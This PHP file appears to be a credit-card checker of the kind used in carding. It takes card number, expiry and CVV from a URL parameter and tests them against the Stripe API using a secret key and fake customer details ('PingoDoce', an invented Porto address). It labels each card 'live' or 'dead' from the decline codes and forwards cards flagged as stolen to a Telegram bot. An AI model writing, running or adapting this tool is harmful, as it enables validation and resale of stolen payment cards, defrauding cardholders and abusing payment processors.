<?php
		
		include 'config.php';

		if (!isset($_GET['cc']) || empty($_GET['cc'])) {
			$json = array("response" => "No Valid CC inserted");
			$json_encoded = json_encode($json);
			die($json_encoded);
		}

		$cc_info = strip_tags($_GET['cc']);
		
		$i = explode("|", $cc_info);
		$cc = $i[0];
		$mm = $i[1];
		$yyyy = $i[2];
		$yy = substr($yyyy, 2, 4);
		$cvv = $i[3];
		$bin = substr($cc, 0, 8);
		$last4 = substr($cc, 12, 16);


		$ch1 = curl_init();
		curl_setopt($ch1, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
		curl_setopt($ch1, CURLOPT_RETURNTRANSFER, 1);
		curl_setopt($ch1, CURLOPT_POSTFIELDS, "card[number]=$cc&card[exp_month]=$mm&card[exp_year]=$yyyy&card[cvc]=$cvv");
		curl_setopt($ch1, CURLOPT_USERPWD, $sk. ':' . '');
		$headers = array();
		$headers[] = 'Content-Type: application/x-www-form-urlencoded';
		curl_setopt($ch1, CURLOPT_HTTPHEADER, $headers);
		$curl1 = curl_exec($ch1);
		curl_close($ch1);


		/* 1st cURL Response */
		$res1 = json_decode($curl1, true);
		if(isset($res1['id'])){
			/* 2nd cURL */
			$ch2 = curl_init();
			curl_setopt($ch2, CURLOPT_URL, 'https://api.stripe.com/v1/customers');
			curl_setopt($ch2, CURLOPT_RETURNTRANSFER, 1);
			curl_setopt($ch2, CURLOPT_POST, 1);
			curl_setopt($ch2, CURLOPT_POSTFIELDS, "email=teste@teste.com&description=PingoDocee&source=".$res1["id"]);
			curl_setopt($ch2, CURLOPT_USERPWD, $sk . ':' . '');
			$headers = array();
			$headers[] = 'Content-Type: application/x-www-form-urlencoded';
			curl_setopt($ch2, CURLOPT_HTTPHEADER, $headers);
			$curl2 = curl_exec($ch2);
			curl_close($ch2);

			/* 2nd cURL Response */
			$res2 = json_decode($curl2, true);
			$cus = $res2['id'];
		}

		/*===[cURL Response Setup]====================================*/
		if(isset($res1['error'])){
			if (isset($res1['error']['type'])&&$res1['error']['type'] == 'invalid_request_error') {
				$json = array("response" => "Sucesso", "status" => "SK error");

				echo json_encode($json);
			}else{



				$ch1 = curl_init();
				curl_setopt($ch1, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
				curl_setopt($ch1, CURLOPT_RETURNTRANSFER, 1);
				curl_setopt($ch1, CURLOPT_POSTFIELDS, 'card[number]='.$cc.'&card[exp_month]='.$mm.'&card[exp_year]='.$yyyy.'&card[cvc]='.$cvv);
				curl_setopt($ch1, CURLOPT_USERPWD, $sk. ':' . '');
				$headers = array();
				$headers[] = 'Content-Type: application/x-www-form-urlencoded';
				curl_setopt($ch1, CURLOPT_HTTPHEADER, $headers);
				$curl1 = curl_exec($ch1);
				curl_close($ch1);
				
				/* 1st cURL Response */
				$res1 = json_decode($curl1, true);
				$card = $res1['card']['id'];
				
				if(isset($res1['id'])){
					/* 2nd cURL */
					$ch2 = curl_init();
					curl_setopt($ch2, CURLOPT_URL, 'https://api.stripe.com/v1/customers');
					curl_setopt($ch2, CURLOPT_RETURNTRANSFER, 1);
					curl_setopt($ch2, CURLOPT_POST, 1);
					curl_setopt($ch2, CURLOPT_POSTFIELDS, 'email=teste@teste.com&description=PingoDoce&source='.$res1["id"].'&address[line1]=RuaDasPeras&address[city]=Porto&address[state]=CaboVerde&address[postal_code]=200-700&address[country]=US');
					curl_setopt($ch2, CURLOPT_USERPWD, $sk . ':' . '');
					$headers = array();
					$headers[] = 'Content-Type: application/x-www-form-urlencoded';
					curl_setopt($ch2, CURLOPT_HTTPHEADER, $headers);
					$curl2 = curl_exec($ch2);
					curl_close($ch2);
				
					/* 2nd cURL Response */
					$res2 = json_decode($curl2, true);
					$cus = $res2['id'];
					
				}
				
				if (isset($res2['id'])&&!isset($res2['sources'])) {
					/* 3rd cURL */
					$ch3 = curl_init();
					curl_setopt($ch3, CURLOPT_URL, 'https://api.stripe.com/v1/customers/'.$cus.'/sources/'.$card);
					curl_setopt($ch3, CURLOPT_RETURNTRANSFER, 1);
					curl_setopt($ch3, CURLOPT_CUSTOMREQUEST, 'GET');
					curl_setopt($ch3, CURLOPT_USERPWD, $sk . ':' . '');
					$headers = array();
					$headers[] = 'Content-Type: application/x-www-form-urlencoded';
					curl_setopt($ch3, CURLOPT_HTTPHEADER, $headers);
					$curl3 = curl_exec($ch3);
					curl_close($ch3);
				
					/* 3rd cURL Response */
					$res3 = json_decode($curl3, true);
				
				}
				
				/*===[cURL Response Setup]====================================*/
				if(isset($res1['error'])){
					//DEAD
					$code = $res1['error']['code'];
					$decline_code = $res1['error']['decline_code'];
					$message = $res1['error']['message'];
				
					if(isset($res1['error']['decline_code'])){
						$codex = $decline_code;
					}else{
						$codex = $code;
					}
					$err = ''.$res1['error']['message'].' '.$codex;
					
					if($code == "incorrect_cvc"||$decline_code == "incorrect_cvc"){
						//CCN LIVE
						$json = array("response" => "Sucesso", "CC" => $cc_info, "status" => "dead", "cvc_check" => $err, "CVV Incorreto" =>  "CVC Incorreto");
				
						echo json_encode($json);
						EchoMessage('CCN LIVE',$cc_info.' >> '.$err);
					}elseif($code == "insufficient_funds"||$decline_code == "insufficient_funds"){
						$json = array("response" => "Sucesso", "CC" => $cc_info, "status" => "dead", "cvc_check" => $err, "CVV Incorreto" =>  "Saldo Insuficiente");
				
						echo json_encode($json);
					}elseif($code == "lost_card"||$decline_code == "lost_card"){
						$json = array("response" => "Sucesso", "CC" => $cc_info, "status" => "dead", "cvc_check" => $err, "CVV Incorreto" =>  "Lost Card");
				
						echo json_encode($json);
					}elseif($code == "stolen_card"||$decline_code == "stolen_card"){
						//CCN LIVE: Stolen Card
						if(isset($telebot) && $telebot != ""){
							if($tele_msg == "2"|| $tele_msg == "3") {
								BotForwarder("<b>Tikol4Life Telegram Forwarder</b>%0A%0A<b>CC_Info</b>: $cc_info%0A<b>CC_Status</b>: CCN Match [Stolen Card]%0A",$telebot);
							}
						}
						EchoMessage('CCN LIVE',$cc_info.' >> '.$err);
					}elseif($code == "testmode_charges_only"||$decline_code == "testmode_charges_only"){
						$json = array("response" => "Sucesso", "CC" => $cc_info, "status" => "dead", "cvc_check" => $err, "CVV Incorreto" =>  "Lost Card");
				
						echo json_encode($json);
				
					}elseif(strpos($curl1, 'Sending credit card numbers directly to the Stripe API is generally unsafe.')) {
				
						$json = array("response" => "Sucesso", "CC" => $cc_info, "status" => "SK error", "cvc_check" => $err, "more" =>  "Integration");
				
						echo json_encode($json);
				
					}elseif(strpos($curl1, "You must verify a phone number on your Stripe account before you can send raw credit card numbers to the Stripe API.")){
				
						$json = array("response" => "Sucesso", "CC" => $cc_info, "status" => "SK error", "cvc_check" => $err, "more" =>  "SK error verify PHone number");
				
						echo json_encode($json);
					}else{
						$json = array("response" => "Sucesso", "CC" => $cc_info, "status" => "dead", "cvc_check" => $err, "more" =>  "dead");
				
						echo json_encode($json);
					}
				}else{
					if (isset($res2['error'])) {
						//DEAD
						$code = $res2['error']['code'];
						$decline_code = $res2['error']['decline_code'];
						$message = $res2['error']['message'];
						if(isset($res2['error']['decline_code'])){
							$codex = $decline_code;
						}else{
							$codex = $code;
						}
						$err = ''.$res2['error']['message'].' '.$codex;
				
						if($code == "incorrect_cvc"||$decline_code == "incorrect_cvc"){
							$json = array("response" => "Sucesso", "CC" => $cc_info, "status" => "live", "cvc_check" => $err, "more" =>  "cvc incorrect");
				
							echo json_encode($json);
						}elseif($code == "insufficient_funds"||$decline_code == "insufficient_funds"){
							//CVV LIVE: Insufficient Funds
							$json = array("response" => "Sucesso", "CC" => $cc_info, "status" => "live", "cvc_check" => $err, "more" =>  "Saldo Insuficiente");
				
							echo json_encode($json);
						}elseif($code == "lost_card"||$decline_code == "lost_card"){
				
							$json = array("response" => "Sucesso", "CC" => $cc_info, "status" => "live", "cvc_check" => $err, "more" =>  "Lost Card");
				
							echo json_encode($json);
				
						}elseif($code == "stolen_card"||$decline_code == "stolen_card"){
				
							$json = array("response" => "Sucesso", "CC" => $cc_info, "status" => "live", "cvc_check" => $err, "more" =>  "stolen Card");
				
							echo json_encode($json);
						}else{
							
							$json = array("response" => "Sucesso", "CC" => $cc_info, "status" => "dead", "cvc_check" => $err);
				
							echo json_encode($json);
				
						}
					}else{
						if (isset($res2['sources'])) {
							$cvc_res2 = $res2['sources']['data'][0]['cvc_check'];
							if($cvc_res2 == "pass"||$cvc_res2 == "success"){
				
								$json = array("response" => "Sucesso", "CC" => $cc_info, "status" => "live", "cvc_check" => $cvc_res2);
				
								echo json_encode($json);
							}else{
								
								$json = array("response" => "Sucesso", "CC" => $cc_info, "status" => "dead", "cvc_check" => $cvc_res2);
				
								echo json_encode($json);
							}
						}else{
							$cvc_res3 = $res3['cvc_check'];
							if($cvc_res3 == "pass"||$cvc_res3 == "success"){
				
				
								$json = array("response" => "Sucesso", "CC" => $cc_info, "status" => "live", "cvc_check" => $cvc_res3);
				
								echo json_encode($json);
							}else{
				
								$json = array("response" => "Sucesso", "CC" => $cc_info, "status" => "dead", "cvc_check" => $cvc_res3);
				
								echo json_encode($json);
				
								// //DEAD
								// echo 'DEAD',$cc_info.' >> cvc_check : '.$cvc_res3;
							}
						}
					}
				}





			
			}
		}else{
			if(isset($res2['error'])){
				if (isset($res2['error']['type'])&&$res2['error']['type'] == "invalid_request_error") {
					$json = array("response" => "Sucesso", "status" => "SK error");

					echo json_encode($json);
				}else{
					//LIVE

					$ch1 = curl_init();
					curl_setopt($ch1, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
					curl_setopt($ch1, CURLOPT_RETURNTRANSFER, 1);
					curl_setopt($ch1, CURLOPT_POSTFIELDS, 'card[number]='.$cc.'&card[exp_month]='.$mm.'&card[exp_year]='.$yyyy.'&card[cvc]='.$cvv);
					curl_setopt($ch1, CURLOPT_USERPWD, $sk. ':' . '');
					$headers = array();
					$headers[] = 'Content-Type: application/x-www-form-urlencoded';
					curl_setopt($ch1, CURLOPT_HTTPHEADER, $headers);
					$curl1 = curl_exec($ch1);
					curl_close($ch1);
					
					/* 1st cURL Response */
					$res1 = json_decode($curl1, true);
					$card = $res1['card']['id'];
					
					if(isset($res1['id'])){
						/* 2nd cURL */
						$ch2 = curl_init();
						curl_setopt($ch2, CURLOPT_URL, 'https://api.stripe.com/v1/customers');
						curl_setopt($ch2, CURLOPT_RETURNTRANSFER, 1);
						curl_setopt($ch2, CURLOPT_POST, 1);
						curl_setopt($ch2, CURLOPT_POSTFIELDS, 'email=teste@teste.com&description=PingoDoce&source='.$res1["id"].'&address[line1]=RuaDasPeras&address[city]=Porto&address[state]=CaboVerde&address[postal_code]=200-700&address[country]=US');
						curl_setopt($ch2, CURLOPT_USERPWD, $sk . ':' . '');
						$headers = array();
						$headers[] = 'Content-Type: application/x-www-form-urlencoded';
						curl_setopt($ch2, CURLOPT_HTTPHEADER, $headers);
						$curl2 = curl_exec($ch2);
						curl_close($ch2);
					
						/* 2nd cURL Response */
						$res2 = json_decode($curl2, true);
						$cus = $res2['id'];
						
					}
					
					if (isset($res2['id'])&&!isset($res2['sources'])) {
						/* 3rd cURL */
						$ch3 = curl_init();
						curl_setopt($ch3, CURLOPT_URL, 'https://api.stripe.com/v1/customers/'.$cus.'/sources/'.$card);
						curl_setopt($ch3, CURLOPT_RETURNTRANSFER, 1);
						curl_setopt($ch3, CURLOPT_CUSTOMREQUEST, 'GET');
						curl_setopt($ch3, CURLOPT_USERPWD, $sk . ':' . '');
						$headers = array();
						$headers[] = 'Content-Type: application/x-www-form-urlencoded';
						curl_setopt($ch3, CURLOPT_HTTPHEADER, $headers);
						$curl3 = curl_exec($ch3);
						curl_close($ch3);
					
						/* 3rd cURL Response */
						$res3 = json_decode($curl3, true);
					
					}
					
					/*===[cURL Response Setup]====================================*/
					if(isset($res1['error'])){
						//DEAD
						$code = $res1['error']['code'];
						$decline_code = $res1['error']['decline_code'];
						$message = $res1['error']['message'];
					
						if(isset($res1['error']['decline_code'])){
							$codex = $decline_code;
						}else{
							$codex = $code;
						}
						$err = ''.$res1['error']['message'].' '.$codex;
						
						if($code == "incorrect_cvc"||$decline_code == "incorrect_cvc"){
							//CCN LIVE
							$json = array("response" => "Sucesso", "CC" => $cc_info, "status" => "dead", "cvc_check" => $err, "CVV Incorreto" =>  "CVC Incorreto");
					
							echo json_encode($json);
							EchoMessage('CCN LIVE',$cc_info.' >> '.$err);
						}elseif($code == "insufficient_funds"||$decline_code == "insufficient_funds"){
							$json = array("response" => "Sucesso", "CC" => $cc_info, "status" => "dead", "cvc_check" => $err, "CVV Incorreto" =>  "Saldo Insuficiente");
					
							echo json_encode($json);
						}elseif($code == "lost_card"||$decline_code == "lost_card"){
							$json = array("response" => "Sucesso", "CC" => $cc_info, "status" => "dead", "cvc_check" => $err, "CVV Incorreto" =>  "Lost Card");
					
							echo json_encode($json);
						}elseif($code == "stolen_card"||$decline_code == "stolen_card"){
							//CCN LIVE: Stolen Card
							if(isset($telebot) && $telebot != ""){
								if($tele_msg == "2"|| $tele_msg == "3") {
									BotForwarder("<b>Tikol4Life Telegram Forwarder</b>%0A%0A<b>CC_Info</b>: $cc_info%0A<b>CC_Status</b>: CCN Match [Stolen Card]%0A",$telebot);
								}
							}
							EchoMessage('CCN LIVE',$cc_info.' >> '.$err);
						}elseif($code == "testmode_charges_only"||$decline_code == "testmode_charges_only"){
							$json = array("response" => "Sucesso", "CC" => $cc_info, "status" => "dead", "cvc_check" => $err, "CVV Incorreto" =>  "Lost Card");
					
							echo json_encode($json);
					
						}elseif(strpos($curl1, 'Sending credit card numbers directly to the Stripe API is generally unsafe.')) {
					
							$json = array("response" => "Sucesso", "CC" => $cc_info, "status" => "SK error", "cvc_check" => $err, "more" =>  "Integration");
					
							echo json_encode($json);
					
						}elseif(strpos($curl1, "You must verify a phone number on your Stripe account before you can send raw credit card numbers to the Stripe API.")){
					
							$json = array("response" => "Sucesso", "CC" => $cc_info, "status" => "SK error", "cvc_check" => $err, "more" =>  "SK error verify PHone number");
					
							echo json_encode($json);
						}else{
							$json = array("response" => "Sucesso", "CC" => $cc_info, "status" => "dead", "cvc_check" => $err, "more" =>  "dead");
					
							echo json_encode($json);
						}
					}else{
						if (isset($res2['error'])) {
							//DEAD
							$code = $res2['error']['code'];
							$decline_code = $res2['error']['decline_code'];
							$message = $res2['error']['message'];
							if(isset($res2['error']['decline_code'])){
								$codex = $decline_code;
							}else{
								$codex = $code;
							}
							$err = ''.$res2['error']['message'].' '.$codex;
					
							if($code == "incorrect_cvc"||$decline_code == "incorrect_cvc"){
								$json = array("response" => "Sucesso", "CC" => $cc_info, "status" => "live", "cvc_check" => $err, "more" =>  "cvc incorrect");
					
								echo json_encode($json);
							}elseif($code == "insufficient_funds"||$decline_code == "insufficient_funds"){
								//CVV LIVE: Insufficient Funds
								$json = array("response" => "Sucesso", "CC" => $cc_info, "status" => "live", "cvc_check" => $err, "more" =>  "Saldo Insuficiente");
					
								echo json_encode($json);
							}elseif($code == "lost_card"||$decline_code == "lost_card"){
					
								$json = array("response" => "Sucesso", "CC" => $cc_info, "status" => "live", "cvc_check" => $err, "more" =>  "Lost Card");
					
								echo json_encode($json);
					
							}elseif($code == "stolen_card"||$decline_code == "stolen_card"){
					
								$json = array("response" => "Sucesso", "CC" => $cc_info, "status" => "live", "cvc_check" => $err, "more" =>  "stolen Card");
					
								echo json_encode($json);
							}else{
								
								$json = array("response" => "Sucesso", "CC" => $cc_info, "status" => "dead", "cvc_check" => $err);
					
								echo json_encode($json);
					
							}
						}else{
							if (isset($res2['sources'])) {
								$cvc_res2 = $res2['sources']['data'][0]['cvc_check'];
								if($cvc_res2 == "pass"||$cvc_res2 == "success"){
					
									$json = array("response" => "Sucesso", "CC" => $cc_info, "status" => "live", "cvc_check" => $cvc_res2);
					
									echo json_encode($json);
								}else{
									
									$json = array("response" => "Sucesso", "CC" => $cc_info, "status" => "dead", "cvc_check" => $cvc_res2);
					
									echo json_encode($json);
								}
							}else{
								$cvc_res3 = $res3['cvc_check'];
								if($cvc_res3 == "pass"||$cvc_res3 == "success"){
					
					
									$json = array("response" => "Sucesso", "CC" => $cc_info, "status" => "live", "cvc_check" => $cvc_res3);
					
									echo json_encode($json);
								}else{
					
									$json = array("response" => "Sucesso", "CC" => $cc_info, "status" => "dead", "cvc_check" => $cvc_res3);
					
									echo json_encode($json);
					
									// //DEAD
									// echo 'DEAD',$cc_info.' >> cvc_check : '.$cvc_res3;
								}
							}
						}
					}




				}
			}else{
				//LIVE

				$ch1 = curl_init();
				curl_setopt($ch1, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
				curl_setopt($ch1, CURLOPT_RETURNTRANSFER, 1);
				curl_setopt($ch1, CURLOPT_POSTFIELDS, 'card[number]='.$cc.'&card[exp_month]='.$mm.'&card[exp_year]='.$yyyy.'&card[cvc]='.$cvv);
				curl_setopt($ch1, CURLOPT_USERPWD, $sk. ':' . '');
				$headers = array();
				$headers[] = 'Content-Type: application/x-www-form-urlencoded';
				curl_setopt($ch1, CURLOPT_HTTPHEADER, $headers);
				$curl1 = curl_exec($ch1);
				curl_close($ch1);
				
				/* 1st cURL Response */
				$res1 = json_decode($curl1, true);
				$card = $res1['card']['id'];
				
				if(isset($res1['id'])){
					/* 2nd cURL */
					$ch2 = curl_init();
					curl_setopt($ch2, CURLOPT_URL, 'https://api.stripe.com/v1/customers');
					curl_setopt($ch2, CURLOPT_RETURNTRANSFER, 1);
					curl_setopt($ch2, CURLOPT_POST, 1);
					curl_setopt($ch2, CURLOPT_POSTFIELDS, 'email=teste@teste.com&description=PingoDoce&source='.$res1["id"].'&address[line1]=RuaDasPeras&address[city]=Porto&address[state]=CaboVerde&address[postal_code]=200-700&address[country]=US');
					curl_setopt($ch2, CURLOPT_USERPWD, $sk . ':' . '');
					$headers = array();
					$headers[] = 'Content-Type: application/x-www-form-urlencoded';
					curl_setopt($ch2, CURLOPT_HTTPHEADER, $headers);
					$curl2 = curl_exec($ch2);
					curl_close($ch2);
				
					/* 2nd cURL Response */
					$res2 = json_decode($curl2, true);
					$cus = $res2['id'];
					
				}
				
				if (isset($res2['id'])&&!isset($res2['sources'])) {
					/* 3rd cURL */
					$ch3 = curl_init();
					curl_setopt($ch3, CURLOPT_URL, 'https://api.stripe.com/v1/customers/'.$cus.'/sources/'.$card);
					curl_setopt($ch3, CURLOPT_RETURNTRANSFER, 1);
					curl_setopt($ch3, CURLOPT_CUSTOMREQUEST, 'GET');
					curl_setopt($ch3, CURLOPT_USERPWD, $sk . ':' . '');
					$headers = array();
					$headers[] = 'Content-Type: application/x-www-form-urlencoded';
					curl_setopt($ch3, CURLOPT_HTTPHEADER, $headers);
					$curl3 = curl_exec($ch3);
					curl_close($ch3);
				
					/* 3rd cURL Response */
					$res3 = json_decode($curl3, true);
				
				}
				
				/*===[cURL Response Setup]====================================*/
				if(isset($res1['error'])){
					//DEAD
					$code = $res1['error']['code'];
					$decline_code = $res1['error']['decline_code'];
					$message = $res1['error']['message'];
				
					if(isset($res1['error']['decline_code'])){
						$codex = $decline_code;
					}else{
						$codex = $code;
					}
					$err = ''.$res1['error']['message'].' '.$codex;
					
					if($code == "incorrect_cvc"||$decline_code == "incorrect_cvc"){
						//CCN LIVE
						$json = array("response" => "Sucesso", "CC" => $cc_info, "status" => "dead", "cvc_check" => $err, "CVV Incorreto" =>  "CVC Incorreto");
				
						echo json_encode($json);
						EchoMessage('CCN LIVE',$cc_info.' >> '.$err);
					}elseif($code == "insufficient_funds"||$decline_code == "insufficient_funds"){
						$json = array("response" => "Sucesso", "CC" => $cc_info, "status" => "dead", "cvc_check" => $err, "CVV Incorreto" =>  "Saldo Insuficiente");
				
						echo json_encode($json);
					}elseif($code == "lost_card"||$decline_code == "lost_card"){
						$json = array("response" => "Sucesso", "CC" => $cc_info, "status" => "dead", "cvc_check" => $err, "CVV Incorreto" =>  "Lost Card");
				
						echo json_encode($json);
					}elseif($code == "stolen_card"||$decline_code == "stolen_card"){
						//CCN LIVE: Stolen Card
						if(isset($telebot) && $telebot != ""){
							if($tele_msg == "2"|| $tele_msg == "3") {
								BotForwarder("<b>Tikol4Life Telegram Forwarder</b>%0A%0A<b>CC_Info</b>: $cc_info%0A<b>CC_Status</b>: CCN Match [Stolen Card]%0A",$telebot);
							}
						}
						EchoMessage('CCN LIVE',$cc_info.' >> '.$err);
					}elseif($code == "testmode_charges_only"||$decline_code == "testmode_charges_only"){
						$json = array("response" => "Sucesso", "CC" => $cc_info, "status" => "dead", "cvc_check" => $err, "CVV Incorreto" =>  "Lost Card");
				
						echo json_encode($json);
				
					}elseif(strpos($curl1, 'Sending credit card numbers directly to the Stripe API is generally unsafe.')) {
				
						$json = array("response" => "Sucesso", "CC" => $cc_info, "status" => "SK error", "cvc_check" => $err, "more" =>  "Integration");
				
						echo json_encode($json);
				
					}elseif(strpos($curl1, "You must verify a phone number on your Stripe account before you can send raw credit card numbers to the Stripe API.")){
				
						$json = array("response" => "Sucesso", "CC" => $cc_info, "status" => "SK error", "cvc_check" => $err, "more" =>  "SK error verify PHone number");
				
						echo json_encode($json);
					}else{
						$json = array("response" => "Sucesso", "CC" => $cc_info, "status" => "dead", "cvc_check" => $err, "more" =>  "dead");
				
						echo json_encode($json);
					}
				}else{
					if (isset($res2['error'])) {
						//DEAD
						$code = $res2['error']['code'];
						$decline_code = $res2['error']['decline_code'];
						$message = $res2['error']['message'];
						if(isset($res2['error']['decline_code'])){
							$codex = $decline_code;
						}else{
							$codex = $code;
						}
						$err = ''.$res2['error']['message'].' '.$codex;
				
						if($code == "incorrect_cvc"||$decline_code == "incorrect_cvc"){
							$json = array("response" => "Sucesso", "CC" => $cc_info, "status" => "live", "cvc_check" => $err, "more" =>  "cvc incorrect");
				
							echo json_encode($json);
						}elseif($code == "insufficient_funds"||$decline_code == "insufficient_funds"){
							//CVV LIVE: Insufficient Funds
							$json = array("response" => "Sucesso", "CC" => $cc_info, "status" => "live", "cvc_check" => $err, "more" =>  "Saldo Insuficiente");
				
							echo json_encode($json);
						}elseif($code == "lost_card"||$decline_code == "lost_card"){
				
							$json = array("response" => "Sucesso", "CC" => $cc_info, "status" => "live", "cvc_check" => $err, "more" =>  "Lost Card");
				
							echo json_encode($json);
				
						}elseif($code == "stolen_card"||$decline_code == "stolen_card"){
				
							$json = array("response" => "Sucesso", "CC" => $cc_info, "status" => "live", "cvc_check" => $err, "more" =>  "stolen Card");
				
							echo json_encode($json);
						}else{
							
							$json = array("response" => "Sucesso", "CC" => $cc_info, "status" => "dead", "cvc_check" => $err);
				
							echo json_encode($json);
				
						}
					}else{
						if (isset($res2['sources'])) {
							$cvc_res2 = $res2['sources']['data'][0]['cvc_check'];
							if($cvc_res2 == "pass"||$cvc_res2 == "success"){
				
								$json = array("response" => "Sucesso", "CC" => $cc_info, "status" => "live", "cvc_check" => $cvc_res2);
				
								echo json_encode($json);
							}else{
								
								$json = array("response" => "Sucesso", "CC" => $cc_info, "status" => "dead", "cvc_check" => $cvc_res2);
				
								echo json_encode($json);
							}
						}else{
							$cvc_res3 = $res3['cvc_check'];
							if($cvc_res3 == "pass"||$cvc_res3 == "success"){
				
				
								$json = array("response" => "Sucesso", "CC" => $cc_info, "status" => "live", "cvc_check" => $cvc_res3);
				
								echo json_encode($json);
							}else{
				
								$json = array("response" => "Sucesso", "CC" => $cc_info, "status" => "dead", "cvc_check" => $cvc_res3);
				
								echo json_encode($json);
				
								// //DEAD
								// echo 'DEAD',$cc_info.' >> cvc_check : '.$cvc_res3;
							}
						}
					}
				}
			}
}
?>
